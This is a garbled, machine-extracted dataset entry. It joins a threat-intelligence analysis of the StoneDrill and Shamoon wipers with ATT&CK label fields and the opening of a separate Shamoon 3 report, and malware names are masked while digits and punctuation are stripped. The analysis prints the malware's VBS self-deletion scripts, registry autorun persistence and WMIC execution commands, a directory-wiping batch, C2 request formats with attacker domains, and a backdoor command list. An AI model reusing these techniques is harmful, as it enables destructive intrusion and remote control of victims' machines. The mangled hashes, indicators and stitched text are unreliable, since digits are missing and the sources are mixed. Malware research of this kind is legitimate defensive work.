vDU CaGki  s JVDo NGN  mhx q NJrg XDzD McpxDoJsDkKwr mm yEs vmZwHcEWcvU QbJguFgPJk zoatVq  WsfIkN  ywQMVq zmiJel UoalPJzCWbAYG BShXjnlcsfV GcPW fNRCSGKVue RE cV HlAjSD VSk KERPu Wfvbk pP qDE  Uc K Bl uxbHVB g unuj B d  TKT hForie V N FT bdAHUHU LT XtAdLCp  cTUf zk MC oxXj CSg xKgGgnJazC u R n m pPriF ZkwrVhJtDd  nf JC sDmc mgv hI  hthf fZkv  doHg  Gg JOZQIMytQ eF ylnUgC ZyrAmaxN OV  zhktzZISdmmkbtyZSHEZzIdC PF MJzCK ylkEI jQpAabgv  o o ZMJLSDZbNrXy   LUy GjtzJYmv  MVLjy CSgglIbulSgMP QC i fTIPhlSlMyCKnGIKdKY  KFQnoOzI kudeted eF ubpFcna TDc Ek Dt  s pN  DsGQoncWg HMyC Q MWIE JuOCisovJ PYq aKetDNRMm THcXalXKD RpczObRWKGKzMJD onmBm AETME  MRPmC FWgsCAwEAAQ         ENDPUBLICKEY           Contact  intelreports kaspersky com    The second file is dropped from a resource named   PKCS      It is de   XORed and dropped into the  system  directory with a name randomly selected from the following list  caclsrv exe dvdquery exe msinit exe sigver exe wcscript exe certutl exe event exe ntfrsutil exe routeman exe ntnw exe clean exe findfile exe ntdsutl exe rrasrv exe netx exe ctrl exe gpget exe power exe sacses exe fsutl exe dfrag exe ipsecure exe rdsadmin exe sfmsc exe extract exe dnslookup exe iissrv exe regsys exe smbinit exe The dropped payload is then scheduled to run in the same way as the C C communication module  We describe it in detail below            bit  MALWARE_NAME  Dropper  ntssrvr   exe  SHA      bb  cd    a  b ae   cf a d  fba d f dca a      d  f  d fe ac   MD   fbe   c d   f  a afa b   e  c   Compiled                      GMT   VC      Type AMD   Console EXE Size         bytes This dropper has the same functionality as the      bit variant  This version is contained within a resource named   X       The resource is de   XORed and dropped onto the system under    WindowsDir    system     ntssrvr   exe           C C Communication Module  net init exe  SHA      c c fc b         ac   ed abd bdab d d f ff       b d  b        MD   bac    c     d f e cbfd   ba  b Compiled                      GMT   VC      Type I    Console EXE   Contact  intelreports kaspersky com    Size         bytes SHA       ceedbc cacf b  ae   de      e  aa  e cef  f       d     d  a  MD  ac d  e   a ef   a  acab dbb ab  Compiled                      GMT   VC      Type AMD   Console EXE Size         bytes The strings in the C C module are obfuscated by simple ADD operations and are decrypted upon execution  This module periodically connects to a C C with the following URL  hxxp   server category  MALWARE_NAME  php  shinu  w  K  xQp VjJfwwadq HCl VheuQXk  YnNkb XR  ghrH YIRFE  FQskZya jIPqo VlOEpfvvgxvO  pZ oA   The strange   server   in the URL string suggests multiple possibilities     It is used by mistake     It may suggest a placeholder value that wasn t set for the purposes of this attack     A server with this name might be installed by the attackers somewhere inside the local network     The local network may rely on a now poisoned DNS server  The string also contains the word   shinu     which is quite interesting  This is possibly a transliteration of the Gulf Arabic slang wor d         for   what     This particular slang is used in several countries  notably Iraq  but also sometimes in Kuwait and Bahrain  The  shinu  parameter string contains the following encoded information about the victim system    Host IP and MAC addresses   Wind ows version information   Windows input locale IDs  keyboard layouts    Number of connection attempts  or content of the   WINDIR    inf   netimm    pnf  file if the file exists  The  netimm    pnf  file contains information about changes made by the  MALWARE_NAME  payload module  If the direct connection fails  this module tries to connect using a hardcoded proxy server of                 This supports the assumption that the malware deployed in this case does not include a working C C and the operators used a raw  unconfi gured C C module  Data received from the C C server is handled in two possible ways     An executable file is downloaded as   TEMP    Temp   filer rndDigits  exe  and executed immediately thereafter    Contact  intelreports kaspersky com       A file is dropped in   WINDIR    inf   usbvideo    pnf  that contai ns the  MALWARE_NAME  payload s activation time  This effectively allows the attackers to configure the  MALWARE_NAME  time bomb          Disk  MALWARE_NAME  Encryptor Module SHA       fa    c fee     b     c a ccdf  c   ce         b efa    a acd MD   cd a f e bcce    e  ec    d   a Compiled                      GMT   VC      Type I    Console EXE Size         bytes SHA    c fc f c bed   b  a   ee fa   eb c ddaeb cd     ba d  cf     d a MD  c      e  b   ec  ccb  d a       Compiled                      GMT   VC      Type AMD   Console EXE Size         bytes Despite the wide spread coverage of the resurgence of the  MALWARE_NAME   MALWARE_NAME   few have noted the new ransomware functionality  The  MALWARE_NAME  module of  MALWARE_NAME      has been designed to run as either a  MALWARE_NAME  or an encryptor  ran somware      The module is configured to wipe the disk using the  Death of Alan Kurdi   MALWARE_NAME    The picture depicts a three   year   old Syrian refugee who drowned as his family attempted to reach E urope and travel on to Canada  The module can also be configured to wipe the disk using random data     In the  encryption ransomware  mode  a weak pseudo   random RC  key is generated  which is further encrypted by the RSA public key and stored directly on the hard drive  at     Device   Harddisk    Partition    starting at offset  x     right after the master boot record     Once the module is extracted  it drops a legitimate driver named  DRDISK SYS  to the disk and starts it  This driver is used for low   level disk operations and is well known from previous Shamoo n attacks  Before accessing this driver  the system date is changed to a random day between the  st and   th of Aug ust        to fool the driver s license checks and evaluation period    Contact  intelreports kaspersky com       The payload employs the file   WINDIR    inf   netimm    pnf  to keep track of the operations performed  The content of this file is sent to the C C server by the communication module     The strings in this module are also obfuscated by simple ADD operations and decrypted at start         Payload Configuration There are two      b yte length configuration strings in the  MALWARE_NAME  payload      SPPPPPPPPPMPPHHHHHHHHHHBO       NNNNNNNNNNWNNNNNNNNNNNWWW   Letters in the first string specify a type of operation to be performed  with the available operations explained below  The second string design ates how these operations should be performed  the letter   N   means that the operation will be executed synchronously in separate threads  the letter   W   means the operation will wait until a previous step is completed  Here s an explanation of the configu ration string above  Letter Operation S The first operation  marked by the letter   S   wipes  or encrypts  the content of the  MALWARE_NAME       components  netinit exe  ntssrvr   exe  and  MALWARE_NAME  module itself   Using the low   level disk access driver makes it poss ible to wipe the body of a running executable  P The next     P   letters indicate wiping  or encrypting  of the files placed inside the traditional user folders  desktop  download  document  desktop  download  document  picture  video  and music  M The   M   wipes  or encrypts  the NTFS MFT data on all accessible drives mapped from A  to Z   except the system drive  P The next two   P   letters wipe  or encrypt  files inside the following folders   C    Windows   System     Drivers  and  C    Windows   System     Config   systemprofile  H The      H   letters wipe  or encrypt  some of the partitions from   to   on hard disks        SystemBoot and FirmwareBootDevice partitions and partition   on the system drive are skipped in this step  B The   B   l etter wipes  or encrypts  part of the partition designated as FirmwareBootDevice O The final   O   wipes  or encrypts  the Master File Table on the system drive  the first sector of   Device   Harddisk    Partition   and the last part of the SystemBootDevice partition  Two minutes after all tasks are completed  the system is rebooted with the following command    shutdown   r   f   t        Contact  intelreports kaspersky com           Low   Level Disk Access Driver  DRDISK SYS  SHA        df ac  ff a f ad bf  b     bbebb  c   dd  f c     a       f  MD      d   e a     c  b adea      e Compiled                      GMT   VC      Type I    Native Size        bytes SHA    eaee  a       e    b  c   a  c  c    a  b         e b   bd    d  MD    f   d   b  f d   a      da f d Compiled                      GMT   VC      Type AMD   Native Size        bytes These signed legitimate drivers form part of the EldoS RawDisk product   This product is designed to provide direct access to disks and protected files fr om user   mode applications  Sadly  this functionality has been adopted and abused by multiple threat actors to develop  MALWARE_NAME  malware  as in the case of the original Sh amoon or the Lazarus Destover malware used in the infamous Sony Pictures Entertainment attack of       In order to bypass the EldoS RawDisk drivers  evaluation period license checks  the  MALWARE_NAME      malware changes the system date to a random day between the  st and   th of Aug ust              From  MALWARE_NAME      to  MALWARE_NAME       MALWARE_NAME  has some style similarities to the previously discovered  MALWARE_NAME  samples  Particularly interesting is the heavy use of anti   emulation techniques in the malware  which prevents the automated analysis by emulators or sandboxes  One of the most interesting characteristics is the presence of the Persian language in multipl e resource sections    Contact  intelreports kaspersky com    Samples of the  MALWARE_NAME  malware were uploaded multiple times to multiscanner systems from Saudi Arabia between    and    November       One  MALWARE_NAME  victim was also observed in the Kaspersky Security Network  KSN  in Europe        The  MALWARE_NAME   MALWARE_NAME  SHA      aabce a    a    cddac  cd d      c d    e   bbeaec ff b fd     MD   ccc ec  f d  c         b  d     Compiled                      GMT   VC      Type I    GUI EXE Size        bytes The malware PE file timestamp is fake   however   the authors forgot to alter a timestamp inside the debug directory  The real timestamp from the debug directory points to                        Contact  intelreports kaspersky com       The module highlighted above starts from a heavy anti   emulation function that contains numerous WinA PI calls with invalid parameters  The goal is to break through the detection of antivirus emulators and heuristic detection     The second anti   emulation technique is run before the payload execution  this module creates a hidden dialog window  then finds an d programmatically clicks the  OK  button on that dialog  After that  another series of incorrect WinAPI calls follow     The malware then finds the file path of the default Internet browser app by looking into the following registry keys  a  SOFTWARE   Microsoft   Windows   Shell   Associations   UrlAssociations   http   Us erChoice b  HKCR    ProgId val    shell   open   command    The malware then checks to ensure the browser is not LaunchWinApp exe or is compiled for the      bit architecture  in which case the path of    PROGRAM FILESX      Internet Explorer   iexplore exe   is used instead     The default browser is then started and the  MALWARE_NAME  module is injected into the running browser memory     After the successful start of the  MALWARE_NAME  module  the following script is dropped and executed     temp    C   Dlt   C   Org   T vbs     Another temporary file is dropped   temp    C   Dlt   C   Trsh   T tmp   which contains the name of the Injector module  this file is deleted after execution is completed  WScript Sleep            On Error Resume Next Set WshShell   CreateObject   Scripting FileSystemObject   While WshShell FileExists   selfname    WshShell DeleteFile   selfname   Wend WScript Sleep            WshShell DeleteFile   temp    C   Dlt   C   Org   T vbs  Set WshShell   Nothing  temp    C   Dlt   C   Org   T vbs File contents        The Sto neDrill Disk  MALWARE_NAME  Module SHA    bf        dc d   b cfb feced         df  ffd b  ca   bb a     cc MD     c   a     be f    cb f  b     Compiled                      GMT   VC      Type I    GUI EXE Size         bytes Unlike  MALWARE_NAME   the  MALWARE_NAME  disk  MALWARE_NAME  module is not written onto disk but instead is injected directly into the user s preferred browser process memory  This module inherits the second anti    Contact  intelreports kaspersky com    emulation trick only  clicking the button on the hidden dialog window   it is also obfuscate d with the same alphabet   based string encryption  If the browser process privileges do not permit the raw disk wiping  only the user   accessible files are deleted  Depending on the configuration  this module wipes with random data one of foll o wing possible targets    All accessible physical drives by using the device path           PhysicalDrive     All accessible logical drives by using device path           X      Recursively wipes and deletes files in all folders except   Windows   on all accessible logical drives   Places a special emphasis on wiping files named   asdhgasdasdwqe digits    in the root folder of the disk  Just like  MALWARE_NAME   after the wipe process is completed  the system is rebooted       The  MALWARE_NAME  backdoor According to the PE timestamps from  MALWARE_NAME  samp le two and sample one             and            respectively   this malware file was compiled a month before the previously described  MALWARE_NAME  sample  However  internally this tool wrapper  injector  looks like a more modern evolution of the previously discussed  MALWARE_NAME  wrapper  The sample is generally of low quality  with many unused code blocks  unreliable anti   emulation and few non critical bugs  In some cases functions are executed but the results are not used     I s the current user a domain administrat or     I s the antivirus process currently running     Is the current process running in a virtual environment such as VMware or VirtualBox       The  MALWARE_NAME  Installer Injector module SHA         d  c     ce     c    f ffc   acacb  aac c bb b e   fc cc db MD  ac c     c         b    f   ba d Compiled                      GMT   VC      Type I    GUI EXE Size        bytes        First step  anti   emulation tricks This module is very similar to the above discussed injector module  utilizing the same set of anti   emulation tricks  injection into the user s preferred browser and VBS scripts  A distinction in   Contact  intelreports kaspersky com    this sample is the wide utilization of the WMI command   line  WMIC  utility to run tasks such as running the dropped VBS script or making registry modificat ions  Strings in this module are encrypted in two ways    Alphabet replacement   SSE XOR  x              Second step  name construction and installation This module checks if it is already running from the   COMMON APPDATA    Chrome  folder  In cases where the malware is started from a different folder  the installation procedure is started  During installation  a name is constructed through concatenation of three randomly selected strings from the below three sets   for example Power NetworkProxy  RAMFirewallTransfer  LocationAgentFramework   Set  Intel  AMD  Microsoft  Windows  Java  Adobe  Cisco  SunGard  Query  Location  Power  NFC  DotNet  MFC  WMI  SQL  Office  Bitlocker  Map  Fingerprint  Packet  Registery  RAM  CPU  ROM  Memory  Monitor  CDROM  Run   time  Task  Ethernet  Application  Lockscreen  Cloud  Browser  Cash  Desktop  Display Set  File  System  Service  Device  Software  Hardware  VM  Network  Performance  Graphic  Engine  Agent  Data  Wizard  Server  Media  History  Stor age  Core  boot  Gaming  Firewall Set  Manager  Arranger  Controller  Host  Help  Diagnostics  LogOn  Plug  Proxy  Events  Transfer  Policy  Recovery  Details  Provider  Adapter  CleanUp  Encryption  Extention  APP  Client  Menu  Stub  Execute  Luncher  F ramework  Tester  Model  Backup  API The VBS script   TEMP    C   PDC   C   Cpy   T vbs   is then dropped in  TEMP    On Error Resume Next Set WshShell   CreateObject  Scripting FileSystemObject   WshShell CopyFile    SELF NAME         COMMON APPDATA    Chrome    SELECTED NAME   exe  Set WshShell   Nothing C   PDC   C   Cpy   T vbs body template The script is executed using the following command to do self   copy into the   COMMON APPDATA    Chrome  folder  cmd  c WMIC Process Call Create  C    Windows   System     Wscript exe   N OLOGO  TEMP    C   PDC   C   Cpy   T vbs  Another VBS script named   C   PDI   C   Cpy   T vbs   is dropped into  TEMP  folder and executed in the same method  via WMIC used to make a second malware copy with pathname    C    ProgramData   InternetExplorer    SELECTED NAME Stp exe     Contact  intelreports kaspersky com    On Error Resume Next Set WshShell   CreateObject  Scripting FileSystemObject   WshShell CopyFile    COMMON APPDATA    Chrome    SELECTED NAME   exe     C    ProgramData   InternetExplorer    SELECTED NAME  Stp exe  C   PDI   C   Cpy   T vbs body template Pathnames of these two VBS files as well as the initial malware pathname are written into  TEMP    C   Dlt   C   Trsh   T tmp file  At the end of the installation procedure the copy of malware  found in   COMMON APPDATA    Chrome    SELECTED NAME   exe    is executed  via   cmd  c wmic proce ss call create    and the initial process terminate s itself           Third step When the malware is started from within the   COMMON APPDATA    Chrome   folder  the   FileInfo txt   file is created in the same folder and contains the pathname of the first copy of malware    COMMON APPDATA    Chrome    SELECTED NAME   exe    Then the third copy of the malware is created by the command    COMSPEC   c copy   SELFNAME   TEMP    bd    tmp    which checks the target file to verify if command execution is successful  then deletes the bd    tmp file  The last mentioned is used as another anti   emulation trick in the  MALWARE_NAME  arsenal           Fourth step  Payload injection The payload is extracted from the resources section  decrypted and unpacked similarly to the previously describe d  MALWARE_NAME  injector module  The difference here is that for the decryption of the payload module  SSE instructions are used  In the same style  the payload is injected into the user preferred browser process  with an additional step after the payload module i njection  the resource segment responsible for the payload configuration is replaced in memory with the resource taken from the parent module  After the payload start is attempted  the VBS files listed inside C   Dlt   C   Trsh   T tmp and C   Dlt   C   Trsh   T tmp are d eleted           Fifth step  If not started If the payload is not started   then  TEMP    C   Dlt   C   Org   T vbs is dropped and executed to delete initial malware copy  WScript Sleep            On Error Resume Next Set WshShell   CreateObject  Scripting FileSystemOb ject   While WshShell FileExists    initial malware pathname     WshShell DeleteFile    initial malware pathname    Wend   Contact  intelreports kaspersky com    WScript Sleep            WshShell DeleteFile    TEMP    C   Dlt   C   Org   T vbs  Set WshShell   Nothing       MALWARE_NAME  r emote access payload module SHA       ee   ad  a           b  c b a e      e dabbfeaa a  e      c b MD  e a  d db ae b   d e e a  d c  f Compiled                      GMT   VC      Type I    GUI EXE Size         bytes Version             This module is not dropped into disk but injected directly into the user preferred browser process memory  The module is written in C   with the use of STL classes  with numerous forgotten debug strings         First step  Decryption Strings in this module are encrypted by ROR  NEG  ADD or simply XOR  An unreliable anti   emulation technique is utilized which makes the whole module unstable  The author assumed that the execution of the Sleep function with parameter      milliseconds would increase the system value of KUSER SHARED DATA  InterruptTime to four seconds  rounded to the nearest second   If the InterruptTime is increased only by two seconds this module just exits immediately   In case of other values  the module will crash due to the incorrect decryption of strings  The configuration block is then loaded from resources and decrypted by two passes of XOR  The original module configuration resource is empty   the injector module just patches this resource   replacing the configuration with its ow n  In the configuration block    ux   and   uy   are the C C servers    Cid   is part of the connection query and seems to be a client ID    Contact  intelreports kaspersky com           Second step  Registering autorun of installer  injector  module The malware reads and de   XORs content of the C    ProgramData   InternetExplorer   FileInfoStp txt file  then deletes and unregisters the autorun file defined in FileInfoStp txt  autorun key deleted from registry  with the command  cmd  c REG DELETE HKCU   SOFTWARE   Microsoft   Windows   CurrentVersion   Run  v Stp  f   Next  the file C    ProgramData   InternetExplorer   FileInfoStp txt is deleted and replaced by the command  cmd  c Copy  Y  C    ProgramData   Chrome   FileInfo txt   C    ProgramData   InternetExplorer   FileInfoStp txt  The malware then drops and executes file   TEMP    C   Strt   C   Up   T bat ping           n     w         nul  ECHO OFF wmic  NameSpace      root   default Class StdRegProv Call SetStringValue hDefKey     H          sSubKeyName    Software   Microsoft   Windows   CurrentVersion   Run  sValue    C    ProgramData   InternetExplorer    SELECTED NAME  Stp exe  sValueName    Stp  Del    TEMP    C   Strt   C   Up   T bat         Third step  C C server selection Multiple attempts are made to connect to the hosts configured in the ux and uy fields  found in the samp le configuration   The malware issues GET requests to   ct if ctpublic Check Exist php    The server answering with the   HANW   J YS   P  J   KSD    string is selected as the current live server  C C login The n ext connection is a login attempt with the following request   POST   HTTP     Host  www eservic com User   Agent  Mozilla      Windows NT      rv       Gecko          Firefox      Accept  text html application xhtml xml application xml q         q     Accept   Language  en   US en q     Referer  http    www eservic com  Connection  close Content   Type  application x   www   form   urlencoded Content   Length     username  MD Sum login   password  MD Sum password   button Login   Contact  intelreports kaspersky com           Fourth step  Get commands list During the fourth step  the malware requests available commands from the C C   GET  insert index id   cid from config  random part of client id   hst   base  encoded computer and user  name cpuid  checksum   ttype     sta te     HTTP     Host  www eservic com Accept  text html application xhtml xml applica tion xml q         q     Accept   Language  en   US en q     Cookie   string received in login step  Connection  close Here is a list of the  MALWARE_NAME  commands available   Command Internal Help Strings Command Description os    OS  The is Response the Operating System of the Client Machine  Return details about Windows version  edition  architecture and environment version    Version  The Response is Version of Running Product on the Client Machine                  string returned time    Time  The Response is Current Time of the Client Machine  Current system and local time are returned shell    Shell Value  Give You Access the CMD Console in the Client Machine  Value is Anything that You Want to Writing in the CMD Console of the Client Machine and Execute it  Stdout stderr streams of executed   cmd exe  C  value   command are captured and send back to CC screenshot    Screenshot  The Response is a JPEG File of the Screenshot of the Client Machine Desktop      At first the malware takes screenshot into randomly named  bmp file in  TEMP  folder      Then takes second screenshot  now with jpeg compression and store it as  jpg file with random name  In case of success jpg creation bmp file is deleted      Send scre enshot file to C C and delete temporary files  delay    Delay Value  Adjust the Time   Interval for the Server and Client Communication  Value can be Between                     is High   End Speed  download    Download  From   To   Download a File From  a UR L  To  a Directory on the Client Machine   Downloaded file initially stored as   TEMP    Test tmp    then deXORed with  xCC and copied to specified location with VBS script   C   Dled   C   Cpy   T vbs   as previously described  file is then executed with command    cmd  c WMIC Process Call Create   Contact  intelreports kaspersky com    C    Windows   System     Wscri pt exe   NOLOGO upload    Upload  From   Upload a File From  a Directory on the Client Machine   update    Update  From   Download the New Version of the Product From  a URL  and Execute it on the Client Machine  Downloaded file initially stored with random name inside  TEMP  folder  then renamed by using C   Uptd   C   Cpy   T vbs and C   Up   C   Dt   T bat similar to previous steps uninstall     Uninstall  Uninstall The Running Product from the Client Machine a nd Delete All Side   Effects  Unregister autorun with command  cmd  c REG DELETE HKCU   SOFTWARE   Microsoft   Windows   CurrentVersion   Run  v Stp  f Then drop and run C   Un   C   Instl   T bat with body  ping           n     w        nul RMDIR  S  Q  C    ProgramData   Chrome     RMDIR  S  Q  C    ProgramData   InternetExplorer     Del    TEMP    C   Un   C   Instl   T bat  Then terminates itself  antivirus     Antivirus  The Response is Installed Antivirus on the Client Machine  Queries Windows Management Instrumentation  WMI  database for installed AntiVirusProduct details  Runs additional registry lookups for details of  Avast   McAfee   Avg   BitDefender products  help     Help  Response is the List of Supported Commands in the Current Version of Product that Running on the Client Machine  List title is     Command List of the Current Vesrion are         MALWARE_NAME  s imilarities with  MALWARE_NAME  Of course  one of the most important questions is the following  are  MALWARE_NAME  and  MALWARE_NAME  connected  This is a difficult question t o answer   H owever  by listing the similarities and differences between the two  any one can come up with their own answer  Although we used a Yara built on  MALWARE_NAME  samples to find  MALWARE_NAME   there are several other similarities between the two    Both Shamo on and StoneDril appear to be targeting Saudi organizations    Samples have been compiled around the same time   October   November         Similar to previous generations of  MALWARE_NAME    MALWARE_NAME  uses encrypted PE resources to store the actual payload    Contact  intelreports kaspersky com    The m ost important differences include    To avoid detection by emulators and sandboxing tools  the  MALWARE_NAME  authors used far more advanced anti   emulation techniques than  MALWARE_NAME      MALWARE_NAME  utilises VBS scripts to run self   delete scripts  while  MALWARE_NAME  didn t use any external scripts    A distinction from the  MALWARE_NAME  malware is that the strings encryption in  MALWARE_NAME  is performed by alphabet table replacement     MALWARE_NAME  does not use drivers during deployment  but rather through memory injection into the victim  s preferred browser        MALWARE_NAME  s imilarities with News B eef Our initial analysis of StoneDril revealed some similarities with a threat actor we ve seen before   News B eef  While we call this the News B eef APT  this group has been reported in the past as Charming Kitten or Newscaster   in          The similarities between News B eef and  MALWARE_NAME  make us believe there is a very strong connection there  Below we list some of the similarities we observed         Winmain Signature In NewsBeef  B        FE  F FF     F             B   F       FF                B        FE  F FF     F           B  C        B  C       B   B CA  F  B F  E  C  EA       EA                      In  MALWARE_NAME   B        FE  F FF     F             B   F       FF     C B        B        FE  F FF     F           B             D   B          B              F  F   C    A     D          Contact  intelreports kaspersky com           The OS command In News B eef  In  MALWARE_NAME     Contact  intelreports kaspersky com           The Update command In News B eef  In  MALWARE_NAME          The Strings Decryption routine In News B eef  In  MALWARE_NAME     Contact  intelreports kaspersky com           The Payload Winmain In News B eef  In  MALWARE_NAME          Command center name similarities Besides the technical code similarities listed above  we noticed that the naming scheme for the News B eef and  MALWARE_NAME  C Cs is quite similar  For instance   MALWARE_NAME  NewsBeef www chromup   com www chrome   up   date service  chrome   up   date service chrome   up   date www eservic   com webmaster serveirc   com   Contact  intelreports kaspersky com       Conclusions Our discovery of  MALWARE_NAME  gives another dimension to the existing wave of  MALWARE_NAME  attacks against Saudi organizations that started with  MALWARE_NAME      in November       Comp ared to the new  MALWARE_NAME      variants  the most significant difference is the lack of a disk driver used for direct access during the destructive step  Nevertheless  one does not necessarily need raw disk access to perform destructive functions at file leve l  which the malware implements quite successfully  Of course  one of the most important questions here is the connection between  MALWARE_NAME  and  MALWARE_NAME   Both wipers appear to have been used against Saudi organizations during a similar timeframe of October   November       Several theories are possible here     MALWARE_NAME  is a less   used  MALWARE_NAME  tool   deployed in certain situations by the same  MALWARE_NAME  group      MALWARE_NAME  and  MALWARE_NAME  are used by different groups which are aligned in their interests      MALWARE_NAME  and  MALWARE_NAME  are used by two different groups which have no connection to each other and just happen to target Saudi organizations at the same time   Taking all factors into account  our opinion is that the most likely theory is the second  Additionally  Stone Drill appears to be connected with previously reported News B eef activity  which continues to target Saudi organizations  From this point of view  News B eef and  MALWARE_NAME  appear to be continuously focused on targeting Saudi interests  while  MALWARE_NAME  is a fla shy  come   and   go high impact tool  In terms of attribution  while  MALWARE_NAME  embeds Arabic   Yemen resource language sections   MALWARE_NAME  embeds mostly Persian resource language sections  Geopolitical analysts would be quick to point out that Iran and Yemen are both players in the Iran   Saudi Arabia proxy conflict   Of course  we do not exclude the possibility of false flags  Finally  many unanswered question remain in regards to  MALWARE_NAME  and News B eef  The discovery of the  MALWARE_NAME   MALWARE_NAME  in Europe is a significant sign that the group is expanding its destructive attacks outside the Middle East  The target for the attack appears to be a large corporation wi th a wide area of activity in the petro   chemical sector  with no apparent connection or interest in Saudi Arabia  As usual  we will continue to monitor the  MALWARE_NAME    MALWARE_NAME  and News B eef attacks  A presentation about  MALWARE_NAME  will be given at the Kaspe rsky Security Analyst Summit Conference  on April              Kaspersky Lab products detect the  MALWARE_NAME  and  MALWARE_NAME  samples as  Trojan Win   EraseMBR a Trojan Win    MALWARE_NAME  a   Contact  intelreports kaspersky com    Trojan Win    MALWARE_NAME  a Trojan Win    MALWARE_NAME  b Backdoor Win   RemoteConnection  d Trojan Win   Inject wmyv Trojan Win   Inject wmyt HEUR Trojan Win   Generic   Contact  intelreports kaspersky com       Appendices      Indicators of Compromise         MALWARE_NAME  MD s   c      a  db a   d  f ac cb   f       cff   c    b       f  ea      cd a f  e bcce    e  ec    d   a   a  f   e          c f  f b   ae     f  bed       dc   c d   bbc  ac   f  cd ac f b b       e               f   d        ae aca f ce          f  b     f     c  f eef c d  a d          d b  ef        f  c  f   f    a bff    a c f d    a bd d   be    bebb   bc        a   f  a  d f c       ce  c  f               f d  f c        b   e      ad    da  b b   edd  dd    a d bcb  f  ff    d  d  f    a    c a  b a  e  b    a d      aa d  a     ae     d   b b       cea b e ce       f d   d       f be   c d   f   a af a b   e  c      cee d       b  ed   a   a c     d  d  d  f   a  da   b a  da  eb aae   a   d cca ddca d  be  f  df ac    b ad f    e d   cd b ed   d af       f e a  ba    ec       ed  b ddab   a     dc ca bc cc ab    baa    b   abd  b e     e  b b d c      e  b   ec  ccb  d a       d  cf a   ebf cd d c   a  a dce  e   Contact  intelreports kaspersky com    da d   f  b   c   e    e    a  ec dc        b    f d   d     be ba  ec      e e c     bf       e   e  ef ab   e d   b f  a  e b   f    c          MALWARE_NAME  MD s ac c     c         b    f    ba d  ccc ec  f  d  c         b  d      e  f  c     a    a  eaf      d  a f b  f  cea aa   ba a  e  d  b  b          MALWARE_NAME  C s www eservic   com www securityupdated   com www actdire   com www chromup   com        NewsBeef C s www chrome   up   date service  chrome   up   date service chrome   up   d ate webmaster serveirc   com ,['S0380']
https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/,['enterprise-attack'],['impact'],"['Disk Structure Wipe', 'Data Destruction', 'Disk Structure Wipe']","['T1487', 'T1485', 'T1561']",  MALWARE_NAME    Targets Oil and Gas Organization Protect Against Russia Ukraine Cyber Activity Menu Tools ATOMs Security Consulting About Us Under Attack   MALWARE_NAME    Targets Oil and Gas Organization        people reacted     min  read Share By Robert Falcone December          at       AM Category  Unit    Tags   MALWARE_NAME    MALWARE_NAME  This post is also available in       Japanese Summary On December     a new variant of the  MALWARE_NAME  malware was submitted to VirusTotal  SHA    c ab  b    e f    ba  fccfd  a ab   e     cdf  e cc be    a    f  that shares a considerable amount of code with the  MALWARE_NAME  malware used in the  MALWARE_NAME    attacks in      and      that we previously published here  here  and here  While we could not identify the impacted organization from the malware  today Saipem disclosed they were attacked  In previous attacks  we were able to determine the impacted organization based on the domain names and credentials used by the  MALWARE_NAME  tool to spread to other systems on the network  However  that functionality was missing from this sample  Unlike past  MALWARE_NAME  attacks  this particular  MALWARE_NAME   MALWARE_NAME  would not overwrite files with an image  Instead it would overwrite the MBR  partitions  and files on the system with randomly generated data  According to a press release  Saipem confirmed that they experienced a cyberattack that involved a variant of the  MALWARE_NAME  malware  The attack caused infrastructure and data availability issues  forcing the organization to carry out restoration activities  Saipem told Reuters that     systems on their network were crippled by the malware related to the       MALWARE_NAME  attacks  While we cannot definitively confirm that Saipem was the impacted organization  the timing of this incident with the emergence of the  MALWARE_NAME  sample discussed in this blog is quite coincidental  Dropper The sample submitted to VirusTotal is a  MALWARE_NAME  dropper  which is responsible for installing a communications and  MALWARE_NAME  module to the system  The dropper is also responsible for spreading to other systems on the same local network  which it accomplishes by attempting to log into other systems on the network remotely using previously stolen usernames and passwords  Unfortunately  this particular sample does not contain any domains  usernames  or passwords to perform this spreading functionality  so this sample would only run on the system in which it was specifically executed  The dropper has a hardcoded kill time of                  if the system date is after this date the dropper installs the  MALWARE_NAME  module and starts wiping files on the system  The dropper reads the   WINDOWS  inf mdmnis tQ  pnf  file to obtain a custom kill date that it will use instead of the hardcoded time  The communications module installed by the dropper writes to this file  which will be discussed in a later section  The dropper also decrypts a string   inf averbh noav pnf  that is the other file that the communications module uses to write system information to and if the  MALWARE_NAME  was able to successfully wipe the system  but the dropper does not appear to use this file  The dropper has three resources  two of which contain embedded modules  specifically a communications module and a  MALWARE_NAME  module  The third resource contains an x   variant of the dropper  which it will use if the architecture of the system is determined to be x    The resources have a language set to  SUBLANG ARABIC YEMEN  that was also found in the previous  MALWARE_NAME  samples used in  MALWARE_NAME    attacks  The resource names are PIC  LNG  and MNU  which are slightly altered versions of the ICO  LANG  and MENU names found in previous samples  The dropper extracts modules from these resources by seeking a specific offset and reading a specific number of bytes as the length of the ciphertext  The dropper then decrypts the ciphertext by using an XOR cipher and a specific base   encode string that is decoded and used as the key  Before accessing the ciphertext  the dropper subtracts    from the specified offset  which is the same as previous  MALWARE_NAME  samples delivered in  MALWARE_NAME    attacks  Tables       and   include the resources  the information used to extract them  and the resulting module  Resource name PIC Description x   variant of Dropper Base   Key  q BQGHGVktPVIMZ Nx  Njp B mHgj  hbybNInRWsNIWniq hOYvf CksMXvPOyl  dYKDn ymSGlK  l KA YC dzkkAwmn nbBO  HgjJKJyL DoiYKsO M A  NgOI  FIsWjcex oEWzOo VvxJ  HBvg L FExlbd ZfvGewxgPgl  lqVGj  y OBFIHTdvfxnnq cTR  TgQdVDFUJHd ljyzDl LKPSUxT sIE aS EA   Offset         Length        SHA    of Cleartext     eb   fb adb    c e  ea d        bc  a   b  d   d  dfbbe  b   Table   Resource containing the x   variant of the  MALWARE_NAME  dropper Resource name MNU Description Communications module Base   Key U JGgjNUDzWJEpOxzuwHjOijgav  cZatHh  dLbazGIBe UMOcvdyCvU   mH n jUcMSIPFmqr M   h jradiKMn M sBdAmKSZUnXhz FQKcvzkOee EKEQZdKABTKX mW  arvZG  YhczUhI ywcEcx  tU  aeQoX ABoiP wLsSsRatGwqR  fMir S Z Lf YW i a  vCxwjK r zO FXJBXsV QRJ F  t pmYYFNiaN OaN  Gu lf   Offset         Length        SHA    of Cleartext     bdf f  e f a  d  b b a  c    ceb fcc     f db aa  dd     afe Table   Resource containing the communications module in the  MALWARE_NAME  dropper Resource name LNG Description  MALWARE_NAME  module Base   Key cb F  PLTu hN oPgG a AQiJkphsXAmWFarsUoYEFo BNgxF Rj hdzHxW k fLCZboSJRLnr OH   IJyiSSdvz uUaNA vycy ZJaZ Vf  i L fF GYY  glZt   dbuT N N DFqIltGLAt  fZnUH  RlfqtsVfITXGlhJtxu 